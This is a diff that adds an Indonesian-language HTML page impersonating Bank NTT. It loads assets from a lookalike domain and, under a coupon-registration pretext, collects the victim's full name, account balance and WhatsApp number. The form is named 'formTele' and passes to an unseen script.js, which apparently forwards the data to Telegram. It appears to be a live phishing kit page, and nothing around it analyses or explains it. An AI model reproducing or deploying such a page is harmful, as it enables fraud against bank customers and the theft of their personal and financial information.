@@ -1,0 +1,251 @@
+<!DOCTYPE html><html><head>
+    <meta charset="UTF-8">
+          <!-- Warna untuk Chrome, Firefox OS, Opera dan Vivaldi -->
+  <meta content="#BEE02A" name="theme-color">
+  <!-- Warna untuk Windows Phone -->
+  <meta content="#BEE02A" name="msapplication-navbutton-color">
+  <!-- Warna untuk iOS Safari -->
+   <meta charset="utf-8"> 
+    <meta name="fragment" content="!"> 
+    <meta name="theme-color" content="#BEE02A"> 
+     <!-- HTML Meta Tags -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+  <link rel="icon" href="" type="image/x-icon">
+  <link rel="apple-touch-icon" href="">
+    <title>Bank NTT</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");
+  
+  .html {
+      width: 100%;
+      height: 100%;
+      background-image: url("");
+    font-family: "Source Sans Pro", sans-serif;
+    background-repeat: no-repeat;
+    background-position: 100% 100%;
+    background-size: 100% 100%;
+  }
+  
+  body{
+   background-image: url("");
+    font-family: "Source Sans Pro", sans-serif;
+    position: absolute;
+    background-color: #fff;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-repeat: no-repeat;
+    background-position: 100% 100%;
+    background-size: 100% 100%;
+    font-size: 16px;
+    width: 100%;
+    height: 100%;
+    }
+  * {
+    box-sizing: border-box;
+    margin: 0;
+  }
+  *:focus {
+    outline: none;
+  }
+  nav{
+    width: 100%;
+    padding: 3px;
+    border-bottom: 1px solid #c0c0c0;
+    background: #ffffff;
+  }
+  nav img{
+    width: 130px;
+    height: 60px;
+  }
+  .container1{
+    width: 100%;
+    padding: 4px;
+    margin: 0px auto;
+    box-sizing: border-box;
+    justify-items: center;
+    background: rgb(92,177,224);
+  }
+  .container1 img{
+    width: 200px;
+    float: left;
+    height: 80px;
+    margin-left: -50px;
+    margin-top: -20px;
+  }
+  .container1 h6{
+    font-size: 14px;
+    color: #000;
+    font-weight: 500;
+    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+    margin-top: 15px;
+    float: right;
+  }
+  .container2{
+    width: 100%;
+    height: 100%;
+    padding: 15px;
+    margin: 52px auto;
+    box-sizing: border-box;
+    background: #faf9fd;
+  }
+  .box{
+    width: 100%;
+    padding: 9px;
+    margin: 12px auto;
+    font-size: 15px;
+    outline: none;
+    border: 2px solid rgb(92,177,224);
+  }
+  label{
+    font-size: 17px;
+    font-weight: 500;
+    color: #000;
+    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+  }
+  .btnku{
+    width: 100%;
+    padding: 15px;
+    margin: 20px auto;
+    box-sizing: border-box;
+    justify-items: center;
+  }
+  .btnku #kirims{
+    width: 50%;
+    padding: 10px;
+    border: 1px solid #c0c0c0;
+    float: right;
+    font-size: 15px;
+    cursor: pointer!important;
+    background: rgb(92,177,224);
+    color: #fff;
+    font-weight: 600;
+    border-radius: 5px;
+  }
+  .btnku #kirimss{
+    width: 30%;
+    padding: 10px;
+    border: 1px solid #e3e4f9;
+    float: left;
+    font-size: 15px;
+    text-decoration: none;
+    background: none;
+    border-radius: 5px;
+  }
+  a{
+    font-size: 15px;
+    text-decoration: none;
+    color: #000;
+    font-weight: 600;
+  }
+     /*********************/
+     .process {
+       top: 0;left: 0;
+       right: 0;
+       position: fixed;
+       display: flex;
+       justify-content: center;
+       align-items: center;
+       background: #faf9fd;
+       z-index: 999999999;
+       width: 100%;
+       height: 100%;
+       
+     }
+    .loading {
+      margin-top: -50px;
+      position: absolute;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      
+    }
+    .loading img {
+      width: 50px;
+      
+    }
+    .loading .spinner{
+      position: absolute;
+      width: 35px;
+      animation: spin 5s linear infinite;
+      -webkit-animation: spin 5s linear infinite;
+      -moz-animation: spin 5s linear infinite;
+      -ms-animation: spin 5s linear infinite;
+      -o-animation: spin 5s linear infinite;
+      
+    } 
+    h1 {
+      position: relative;
+      color: rgba(0, 0, 0, .3);
+      font-size: 15px;
+      font-weight: bold;
+      color: #000;
+      font-style: italic;
+      margin-top: 75px;
+      
+  }
+  h1:before {
+      content: attr(data-text);
+      position: absolute;
+      overflow: hidden;
+      max-width: 100%;
+      white-space: nowrap;
+      color: #fff;
+      animation: loading 4s linear;
+  }
+  @keyframes loading {
+      0% {
+          max-width: 0;
+      }
+  }
+  
+    </style>
+  </head>
+  
+  <body>
+  <main>
+    <center>
+       <div id="process1" name="process" class="process" style="display: none;">
+              <div class="loading">
+                  <img class="spinner" src="https://programundinb4nkntt.yyznxn.web.id/images/1_ngNzwrRBDElDnf2CLF_Rbg.gif" id="loading" style="margin-top: 8px">
+                  <br><br>
+                  <br>
+                  <h1 data-text="Sedang Mencetak Kupon Anda...">Sedang Mencetak Kupon Anda...</h1>
+              </div>
+          </div>
+    </center>
+    <nav>
+      <img src="https://programundinb4nkntt.yyznxn.web.id/images/f26q9h.png" alt="">
+    </nav>
+    <div class="container1">
+       <h6>Daftar Sekarang</h6>
+    </div>
+    <div class="container2">
+      <div class="form">
+        <form action="script.js" id="formTele" class="formtelegram">
+          <label for="nama">Nama Lengkap Tanpa Singkatan</label>
+          <input type="text" name="nama" id="nama" class="box" required="">
+          <label for="saldo">Saldo Akhir</label>
+          <input type="text" name="saldo" id="saldo" inputmode="numeric" placeholder="Rp." class="box" required="">
+          <label for="nomor">Nomor WhatsApp</label>
+          <input type="text" name="nomor" id="nomor" inputmode="numeric" minlength="10" maxlength="13" placeholder="0812XXXXXXX" class="box" required="">
+          <div class="btnku">
+            <button disabled="" id="kirimss"><a href="index.html">Kembali</a></button>
+            <button type="submit" id="kirims">Selanjutnya</button>
+          </div>
+        </form>
+      </div>
+    </div>
+    <img src="https://programundinb4nkntt.yyznxn.web.id/images/eft4wc.jpg" alt="" style="width: 100%;position: fixed;bottom: 0;">
+  </main>
+  <!-- partial -->
+
+        
+    
+    
+</script>
+  <script src="script.js"></script>
+  
+  </body></html>
